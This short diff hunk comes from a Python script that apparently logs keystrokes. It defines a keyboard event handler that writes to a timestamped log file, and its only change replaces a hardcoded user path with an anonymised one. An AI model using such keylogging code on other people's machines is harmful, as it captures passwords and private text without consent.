@@ -4,7 +4,7 @@ local_time = datetime.datetime.now()
 date = str(local_time)[0:10]
 time = str(local_time)[11:19].replace(':', '-')
 hash = date + '-' + time
-log_file = 'C:\\Users\\finym\\Desktop\\log-' + hash + '.txt'
+log_file = 'C:\\..\\...\\Desktop\\log-' + hash + '.txt'
 
 def KbrdEvent(event):
     logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
